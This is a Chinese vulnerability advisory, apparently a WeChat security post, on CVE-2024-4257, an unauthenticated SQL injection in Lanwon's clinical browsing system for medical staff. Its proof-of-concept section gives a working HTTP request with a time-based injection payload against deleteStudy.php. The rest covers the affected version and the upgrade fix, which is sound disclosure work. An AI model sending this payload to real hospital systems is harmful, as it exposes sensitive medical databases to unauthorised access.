---
cve: "CVE-2024-4257"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  漏洞预警 | 蓝网科技临床浏览系统 SQL注入漏洞   
浅安  浅安安全   2024-05-13 07:00  
  
**0x00 漏洞编号**  
- # CVE-2024-4257  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
蓝网科技临床浏览系统是一个专门用于医疗行业的软件系统，主要用于医生、护士和其他医疗专业人员在临床工作中进行信息浏览、查询和管理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7stTqD182SVfR8wYZUibN5icwIjcUwJ5yicM2vjV8cDeE2NR5cWJkzRJxibcwT6Mw7GEcKnfO7saljmxUfnZTlQYAA/640?wx_fmt=png&from=appmsg "")  
  
**0x03 漏洞详情**  
###   
###   
  
**CVE-2024-4257**  
  
**漏洞类型：**  
SQL注入  
  
  
**影响：**  
  
获取敏感信息  
  
**简述：**  
蓝网科技临床浏览系统存在SQL注入漏洞，未授权的攻击者可以利用该漏洞获取数据库敏感信息。  
###   
  
**0x04 影响版本**  
- 蓝网科技临床浏览系统 1.2.1  
  
**0x05****POC**  
```
GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://www.lanwon.com/  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
